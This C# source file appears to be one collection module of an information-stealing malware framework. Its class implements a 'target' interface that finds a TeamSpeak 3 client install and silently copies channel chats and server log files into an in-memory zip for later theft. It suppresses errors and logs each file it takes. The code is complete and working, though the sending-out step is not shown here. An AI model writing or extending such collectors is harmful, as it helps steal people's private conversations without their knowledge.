using Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Targets.Applications
{
	public class TeamSpeak : ITarget
	{
		private readonly bool _collectChannelChats = true;
		private readonly bool _collectServerLogs = true;
		private readonly long _minFileSize = 50;

		public void Collect(InMemoryZip zip, Counter counter)
		{
			// TeamSpeak-Installationspfade suchen
			string[] possiblePaths = new string[]
			{
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "TeamSpeak 3 Client"),
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "TeamSpeak 3 Client")
			};

			// Ersten existierenden Pfad finden
			string teamspeakPath = possiblePaths.FirstOrDefault(Directory.Exists);

			if (string.IsNullOrEmpty(teamspeakPath))
				return;

			string chatsPath = Path.Combine(teamspeakPath, "config", "chats");

			if (!Directory.Exists(chatsPath))
				return;

			string[] chatDirectories = Directory.GetDirectories(chatsPath);

			if (chatDirectories == null || chatDirectories.Length == 0)
				return;

			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = nameof(TeamSpeak);

			int directoryIndex = 1;

			foreach (string chatDir in chatDirectories)
			{
				// Alle Textdateien im Verzeichnis sammeln und filtern
				string[] chatFiles = Directory.EnumerateFiles(chatDir, "*.txt", SearchOption.TopDirectoryOnly)
					.Where(file =>
					{
						string fileName = Path.GetFileName(file);

						// Filtern nach Dateiname
						if (string.IsNullOrEmpty(fileName))
							return false;

						// Channel-Chats filtern wenn deaktiviert
						if (!_collectChannelChats && fileName.StartsWith("channel", StringComparison.OrdinalIgnoreCase))
							return false;

						// Server-Logs filtern wenn deaktiviert
						if (!_collectServerLogs && fileName.StartsWith("server", StringComparison.OrdinalIgnoreCase))
							return false;

						// Dateigröße prüfen
						try
						{
							return new FileInfo(file).Length >= _minFileSize;
						}
						catch
						{
							return false;
						}
					})
					.ToArray();

				if (chatFiles.Length > 0)
				{
					foreach (string chatFile in chatFiles)
					{
						try
						{
							string fileName = Path.GetFileName(chatFile);
							string entryPath = $"TeamSpeak\\{directoryIndex}\\{fileName}";

							byte[] fileContent = File.ReadAllBytes(chatFile);
							zip.AddFile(entryPath, fileContent);

							counterApplications.Files.Add($"{chatFile} => {entryPath}");
						}
						catch
						{
							// Fehler beim Lesen ignorieren
						}
					}

					directoryIndex++;
				}
			}

			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add("TeamSpeak\\");
				counter.Applications.Add(counterApplications);
			}
		}
	}
}